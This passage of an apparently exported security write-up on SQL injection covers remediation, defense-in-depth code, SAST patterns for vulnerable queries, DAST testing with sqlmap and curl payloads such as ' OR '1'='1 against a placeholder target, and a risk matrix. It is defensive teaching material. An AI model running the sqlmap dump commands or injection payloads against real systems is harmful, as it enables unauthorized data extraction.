+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-803b-aed6-c37d9a2e924f" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80fd-a2dc-d38ae1280af9" class="bulleted-list"><li style="list-style-type:disc"><strong>Confidentiality</strong>: Critical - Slow but complete data extraction</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80bd-9843-fe634ee3d12e" class="bulleted-list"><li style="list-style-type:disc"><strong>Business Impact</strong>: High - Persistent data breach</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-806b-bfee-d0563010cd55" class=""><strong>Root Cause:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f9-98a0-c62b3c215ae8" class="bulleted-list"><li style="list-style-type:disc">No input validation</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80b5-871b-eeb47a61822d" class="bulleted-list"><li style="list-style-type:disc">No parameterized queries</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80b3-81b7-f2a8c04cbeac" class="bulleted-list"><li style="list-style-type:disc">No query timeouts</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-800b-af6c-f598a245d04b" class=""><strong>Remediation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8065-b502-c95a2cbde3fb" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># Fixed code
+query = &quot;SELECT * FROM users WHERE id = ?&quot;
+cursor.execute(query, (user_id,))
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-800d-89dd-fd4aff60baf2"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-80bb-9d17-f864ff5660d2" class=""><strong>Advanced Mitigations</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80e1-87af-d9e9b055371b" class=""><strong>Defense in Depth Strategy</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80a9-b815-c8d98c5b90df" class=""><strong>Layer 1: Input Validation</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8097-8f55-c61e3c6321d3" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">import re
+
+def validate_user_input(input_value, input_type):
+    if input_type == &#x27;id&#x27;:
+        if not re.match(r&#x27;^\d+$&#x27;, str(input_value)):
+            raise ValueError(&quot;Invalid ID&quot;)
+        return int(input_value)
+    elif input_type == &#x27;username&#x27;:
+        if not re.match(r&#x27;^[a-zA-Z0-9_]{3,20}$&#x27;, input_value):
+            raise ValueError(&quot;Invalid username&quot;)
+        return input_value
+    return input_value
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80ee-9c3e-fc2cf6cfd586" class=""><strong>Layer 2: Parameterized Queries</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8083-8770-dc6d9daed435" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">query = &quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;
+cursor.execute(query, (username, password))
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80c6-8162-ee9a0b2972e9" class=""><strong>Layer 3: Least Privilege</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8070-8f02-f21f7da8e3ae" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">-- Application user with minimal privileges
+CREATE USER &#x27;app_user&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;strong_password&#x27;;
+GRANT SELECT, INSERT, UPDATE ON app_db.* TO &#x27;app_user&#x27;@&#x27;localhost&#x27;;
+-- No DROP, ALTER, or EXECUTE privileges
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8065-8d9a-c09d25960578" class=""><strong>Layer 4: Error Handling</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-801b-936f-fd9e77a51c50" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">try:
+    cursor.execute(query, params)
+except DatabaseError as e:
+    logger.error(f&quot;Database error: {str(e)}&quot;)
+    # Don&#x27;t expose error details to user
+    raise ApplicationError(&quot;An error occurred&quot;)
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8026-b73e-c0b08e0b6ea0" class=""><strong>Layer 5: Monitoring</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8028-ab29-e19ca9327976" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># Log suspicious patterns
+if re.search(r&quot;[&#x27;;--]&quot;, user_input):
+    logger.warning(f&quot;Potential SQL injection attempt: {user_input}&quot;)
+    alert_security_team(user_input, request.ip)
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-804f-9cf2-f1680f76c1a7" class=""><strong>Query Timeouts</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80bd-99ed-e70312787b50" class=""><strong>Implementation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8074-a32a-e1bc6f3e7b54" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">import signal
+
+def execute_with_timeout(query, params, timeout=5):
+    def timeout_handler(signum, frame):
+        raise TimeoutError(&quot;Query timeout&quot;)
+
+    signal.signal(signal.SIGALRM, timeout_handler)
+    signal.alarm(timeout)
+    try:
+        result = cursor.execute(query, params)
+        signal.alarm(0)
+        return result
+    except TimeoutError:
+        logger.error(&quot;Query timeout - potential attack&quot;)
+        raise
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8050-8f87-c075f9f29ecc" class=""><strong>Input Sanitization (Secondary Defense)</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80f2-ac0f-faca28d50d6f" class=""><strong>Implementation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8014-8d8c-fa75ab73e75d" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">def sanitize_input(input_value):
+    # Remove SQL keywords (not primary defense!)
+    sql_keywords = [&#x27;SELECT&#x27;, &#x27;INSERT&#x27;, &#x27;UPDATE&#x27;, &#x27;DELETE&#x27;, &#x27;DROP&#x27;, &#x27;UNION&#x27;]
+    for keyword in sql_keywords:
+        input_value = input_value.replace(keyword, &#x27;&#x27;)
+    return input_value
+
+# Note: This is NOT sufficient alone - use parameterized queries!
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80c8-b61f-d7b25b63555b"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8011-b859-c3ec7ec3a9ce" class=""><strong>SAST/DAST Detection</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8029-8e00-e50a3eee9018" class=""><strong>SAST (Static Application Security Testing)</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8036-b6ba-d9179922f146" class=""><strong>Vulnerable Code Patterns:</strong></p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-806c-a75a-d4b1bd8617c6" class=""><strong>1. String Concatenation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80be-8ad2-fd76d1c319ae" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># ❌ VULNERABLE
+query = &quot;SELECT * FROM users WHERE username = &#x27;&quot; + username + &quot;&#x27;&quot;
+
+# SAST Detection:
+# - Pattern: String concatenation with user input
+# - Severity: High
+# - CWE: CWE-89 (SQL Injection)
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80c1-807c-e2e6469c9882" class=""><strong>2. String Formatting:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80b7-8ce7-f0ac2bd2ee78" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># ❌ VULNERABLE
+query = f&quot;SELECT * FROM users WHERE username = &#x27;{username}&#x27;&quot;
+
+# SAST Detection:
+# - Pattern: f-string with user input in SQL
+# - Severity: High
+# - CWE: CWE-89
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8013-aba2-e85e2e38bbc6" class=""><strong>3. Dynamic Query Building:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-801f-81bf-e94562b2b845" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># ❌ VULNERABLE
+query = &quot;SELECT * FROM users WHERE 1=1&quot;
+if username:
+    query += f&quot; AND username = &#x27;{username}&#x27;&quot;
+
+# SAST Detection:
+# - Pattern: Dynamic query building with user input
+# - Severity: High
+# - CWE: CWE-89
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80c9-9a20-de51505e9270" class=""><strong>4. No Parameterized Queries:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80a8-8529-f6148cec00b1" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># ❌ VULNERABLE
+cursor.execute(f&quot;SELECT * FROM users WHERE id = {user_id}&quot;)
+
+# SAST Detection:
+# - Pattern: execute() with string formatting
+# - Severity: High
+# - CWE: CWE-89
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8065-8821-c3caa79619d4" class=""><strong>DAST (Dynamic Application Security Testing)</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-801c-bdf6-ddfa12cb6f5d" class=""><strong>Testing Methodology:</strong></p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8031-b809-d4f90d138f51" class=""><strong>1. Basic Injection Testing:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80dc-a17b-f1a01c1979d3" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all"># Test basic payloads
+sqlmap -u &quot;http://target.com/page?id=1&quot; --dbs
+
+# Manual testing
+curl &quot;http://target.com/page?id=1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-802f-9525-f568a2949da8" class=""><strong>2. Error-Based Testing:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-808b-825c-c8ce85c348ee" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all"># Trigger errors
+curl &quot;http://target.com/page?id=1&#x27;&quot;
+
+# Analyze error messages
+# Look for database errors, stack traces
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80a2-ae0d-d9fbbbbb556f" class=""><strong>3. Blind Injection Testing:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8031-97db-d9bde71eaf3d" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all"># Time-based
+sqlmap -u &quot;http://target.com/page?id=1&quot; --technique=T
+
+# Boolean-based
+sqlmap -u &quot;http://target.com/page?id=1&quot; --technique=B
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-802c-95f3-cf989cd100be" class=""><strong>4. Union-Based Testing:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8046-9549-d9b4d87acd43" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all"># Union extraction
+sqlmap -u &quot;http://target.com/page?id=1&quot; --technique=U --dump
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8071-a873-fa3db86d49f0" class=""><strong>Common DAST Findings:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8052-b260-d5d59e98ce44" class="bulleted-list"><li style="list-style-type:disc">Direct SQL injection in login forms</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80fa-9e73-d2917a34fc76" class="bulleted-list"><li style="list-style-type:disc">Union-based injection in search</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-807b-802d-ebb7549a06ec" class="bulleted-list"><li style="list-style-type:disc">Blind SQL injection in filters</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8091-8494-ecf5dd4ba4c0" class="bulleted-list"><li style="list-style-type:disc">Second-order injection in registration</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8040-940d-f5bd8ab686e9" class="bulleted-list"><li style="list-style-type:disc">Error message disclosure</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80d7-9b9a-ebf8d61da4c8"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-802a-9335-d272ec17a4d4" class=""><strong>Risk Assessment</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8047-b882-ca688d134ac2" class=""><strong>Risk Matrix</strong></h3></div><div style="display:contents" dir="ltr"><table id="2d5562ad-76f0-801a-b023-ed64350236b7" class="simple-table"><thead class="simple-table-header"><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-80fa-b05e-c8f0c064e9fd"><th id="FI_h" class="simple-table-header-color simple-table-header">Vulnerability</th><th id="jSbZ" class="simple-table-header-color simple-table-header">Likelihood</th><th id="M~G&gt;" class="simple-table-header-color simple-table-header">Impact</th><th id="PT{e" class="simple-table-header-color simple-table-header">Risk Level</th><th id=";YjO" class="simple-table-header-color simple-table-header">Business Impact</th></tr></div></thead><tbody><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-8082-9f49-c66c5506fd0e"><td id="FI_h" class=""><strong>Authentication Bypass</strong></td><td id="jSbZ" class="">High</td><td id="M~G&gt;" class="">Critical</td><td id="PT{e" class=""><strong>Critical</strong></td><td id=";YjO" class="">Complete system compromise</td></tr></div><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-8001-b929-fcac4253ac95"><td id="FI_h" class=""><strong>Data Extraction</strong></td><td id="jSbZ" class="">High</td><td id="M~G&gt;" class="">Critical</td><td id="PT{e" class=""><strong>Critical</strong></td><td id=";YjO" class="">Data breach, GDPR violation</td></tr></div><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-80dc-b1e5-da7ca3a9a3de"><td id="FI_h" class=""><strong>Data Manipulation</strong></td><td id="jSbZ" class="">Medium</td><td id="M~G&gt;" class="">High</td><td id="PT{e" class=""><strong>High</strong></td><td id=";YjO" class="">Data integrity compromise</td></tr></div><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-803f-8a34-f9986d4158f0"><td id="FI_h" class=""><strong>Remote Code Execution</strong></td><td id="jSbZ" class="">Low</td><td id="M~G&gt;" class="">Critical</td><td id="PT{e" class=""><strong>High</strong></td><td id=";YjO" class="">Server compromise</td></tr></div><div style="display:contents" dir="ltr"><tr id="2d5562ad-76f0-80d8-958e-e18181e45f92"><td id="FI_h" class=""><strong>Denial of Service</strong></td><td id="jSbZ" class="">Medium</td><td id="M~G&gt;" class="">Medium</td><td id="PT{e" class=""><strong>Medium</strong></td><td id=";YjO" class="">Service disruption</td></tr></div></tbody></table></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80bf-b600-d25e5f4f4e5b" class=""><strong>Risk Calculation</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8036-a538-ca58576965da" class=""><strong>Formula:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8092-93a0-e62cc3f966a3" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Risk = Likelihood × Impact
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8066-bb69-e0d22f58ec01" class=""><strong>Example: Authentication Bypass</strong></p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8072-9b0a-e1e665f475ff" class=""><strong>Likelihood:</strong> High (0.8)</p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f6-a694-efe1854d9391" class="bulleted-list"><li style="list-style-type:disc">Common vulnerability</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-801e-a0ad-e714e2b0650b" class="bulleted-list"><li style="list-style-type:disc">Easy to exploit</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8008-839e-e68b5fae9015" class="bulleted-list"><li style="list-style-type:disc">Often found in login forms</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-801b-b5cb-e37245c39c21" class=""><strong>Impact:</strong> Critical (1.0)</p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8001-8467-d43e3dcfef1a" class="bulleted-list"><li style="list-style-type:disc">Complete system access</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8094-95a8-cde5fbadceb9" class="bulleted-list"><li style="list-style-type:disc">All user accounts compromised</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8099-93c4-cbc15d2712eb" class="bulleted-list"><li style="list-style-type:disc">Data breach</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80f4-be29-cc9406a0d578" class=""><strong>Risk Score:</strong> 0.8 × 1.0 = <strong>0.8 (Critical Risk)</strong></p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80e8-b34d-cc80ef1abfa1" class=""><strong>Business Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8044-80f7-eb96b2cb715d" class="bulleted-list"><li style="list-style-type:disc"><strong>Financial</strong>: Data breach fines (GDPR: up to 4% revenue)</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d0-b649-eb8143d79292" class="bulleted-list"><li style="list-style-type:disc"><strong>Reputation</strong>: Loss of customer trust</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d2-9b38-db7ff7dcc5ea" class="bulleted-list"><li style="list-style-type:disc"><strong>Operational</strong>: System downtime, incident response</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f3-a3e3-c76513ba0d22" class="bulleted-list"><li style="list-style-type:disc"><strong>Legal</strong>: Regulatory compliance violations</li></ul></div><div 